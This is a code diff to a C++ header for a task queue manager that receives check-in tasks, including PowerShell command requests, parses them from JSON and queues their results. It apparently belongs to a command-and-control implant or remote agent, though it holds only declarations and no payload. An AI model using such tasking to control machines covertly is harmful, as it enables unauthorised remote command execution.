@@ -1,18 +1,25 @@
 #pragma once
 #include <string>
 #include <queue>
+#include <variant>
 #include "CheckinModels.h"
+#include "Command.h"
+#include "Task.h"
+
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>>;
+using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 class TaskQueueManager {
 public:
 	TaskQueueManager();
 	bool HasPendingResult();
 	bool HasPendingTask();
-	void StoreTaskResult(int taskID, bool isSuccessful, std::string output);
+	void StoreTaskResult(Response);
 	std::string GetTaskResult();
 	void QueueTask(std::string);
-	CheckinResponse GetNextTask();
+	Request GetNextTask();
+	Request ParseTaskRequest(const std::string& rawJson);
 private:
-	std::queue<ResultRequest> taskResults;
+	std::queue<Response> taskResults;
 	std::queue<std::string> taskQueue;
 };
